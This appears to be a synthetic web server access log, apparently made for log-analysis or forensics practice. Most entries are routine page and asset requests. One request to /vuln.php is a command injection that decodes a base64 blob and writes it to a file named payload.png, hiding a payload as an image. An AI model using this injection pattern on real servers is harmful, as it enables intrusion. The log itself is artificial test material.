192.168.1.11 - - [02/Sep/2025:20:53:10 +0700] "GET /images/banner.png HTTP/1.1" 200 7606 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:20:16:03 +0700] "GET /api/data?id=42 HTTP/1.1" 200 2481 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:20:33:15 +0700] "GET /cart.php HTTP/1.1" 200 3540 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:21:09:10 +0700] "GET /assets/app.js HTTP/1.1" 200 7200 "-" "Edge/18.18363"
203.0.113.5 - - [02/Sep/2025:19:23:45 +0700] "GET /vuln.php?cmd=echo%20Wb4/TLV9Zqpdf22qrc+KP6+jOwdP2tc9Vrr92Vawk6Pa+q/W4di4cm+Zpryj12flqt/+/r17o79zW7w0uA1bYkt/bvtyn8Hz8Upmmyr+PlS9P5no+snr3xJb9kbEuseGbVPpRa/qt+fozlvyrRSG/yaHfaer3D9Xv/+pfvsjKq+f6rcno+0d0RkRe+8qc0EFgGHqPji93B8R8TtRcZZp2xTPFA5KRVe3h13FLBhsCpEb7atz20vj2pF78OD1WCbstG2KZ/IHwpKD1kgDVCy7PXL9eF8e8wFu2a5yowUui/wxeASdse2l4vdQWH54x+La1l8=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
192.168.1.13 - - [02/Sep/2025:19:04:42 +0700] "GET /login.php HTTP/1.1" 200 5341 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:19:50:54 +0700] "GET /api/data?id=42 HTTP/1.1" 200 10272 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:20:19:30 +0700] "GET /products.php?id=12 HTTP/1.1" 200 3145 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:20:36:18 +0700] "GET /blog/post1 HTTP/1.1" 200 7605 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:20:37:20 +0700] "GET /robots.txt HTTP/1.1" 200 3703 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:20:15:20 +0700] "GET /blog/post3 HTTP/1.1" 200 3198 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:20:43:00 +0700] "GET /favicon.ico HTTP/1.1" 200 5834 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:19:14:06 +0700] "GET /dashboard.php HTTP/1.1" 200 4454 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:02:10 +0700] "GET /index.php HTTP/1.1" 200 5046 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:23:03:30 +0700] "GET /assets/style.css HTTP/1.1" 200 11047 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:56:03 +0700] "GET /blog/post1 HTTP/1.1" 200 1601 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:20:17:30 +0700] "GET /blog/post1 HTTP/1.1" 200 3784 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:43:39 +0700] "GET /sitemap.xml HTTP/1.1" 200 1650 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:19:40:18 +0700] "GET /dashboard.php HTTP/1.1" 200 5540 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:19:32:40 +0700] "GET /blog/post3 HTTP/1.1" 200 8808 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:09:12 +0700] "GET /sitemap.xml HTTP/1.1" 200 11987 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:19:27:54 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 2929 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:20:44:55 +0700] "GET /images/banner.png HTTP/1.1" 200 6549 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:01:56 +0700] "GET /index.php HTTP/1.1" 200 5282 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:21:18:06 +0700] "GET /checkout.php HTTP/1.1" 200 7737 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:09:17 +0700] "GET /cart.php HTTP/1.1" 200 6913 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:58:55 +0700] "GET /sitemap.xml HTTP/1.1" 200 1861 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:22:50:30 +0700] "GET /assets/main.js HTTP/1.1" 200 6169 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:20:19:42 +0700] "GET /cart.php HTTP/1.1" 200 5887 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:41:40 +0700] "GET /blog/post2 HTTP/1.1" 200 1493 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:20:54:57 +0700] "GET /news.php?page=2 HTTP/1.1" 200 10052 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:20:43:33 +0700] "GET /login.php HTTP/1.1" 200 2807 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:19:59:45 +0700] "GET /blog/post2 HTTP/1.1" 200 7375 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:25:56 +0700] "GET /api/data?id=42 HTTP/1.1" 200 4558 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:20:38:10 +0700] "GET /about.php HTTP/1.1" 200 6094 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:21:25:20 +0700] "GET /blog/post1 HTTP/1.1" 200 10846 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:20:58:00 +0700] "GET /images/banner.png HTTP/1.1" 200 3454 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:20:10:52 +0700] "GET /api/data?id=42 HTTP/1.1" 200 4347 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:19:19:56 +0700] "GET /blog/post2 HTTP/1.1" 200 2115 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:36:07 +0700] "GET /index.php HTTP/1.1" 200 6662 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:22:35:10 +0700] "GET /assets/style.css HTTP/1.1" 200 9840 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:21:35:36 +0700] "GET /blog/post2 HTTP/1.1" 200 11726 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:21:42:24 +0700] "GET /dashboard.php HTTP/1.1" 200 3800 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:21:17:03 +0700] "GET /about.php HTTP/1.1" 200 3840 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:44:45 +0700] "GET /checkout.php HTTP/1.1" 200 10484 "-" "Bingbot/2.0"
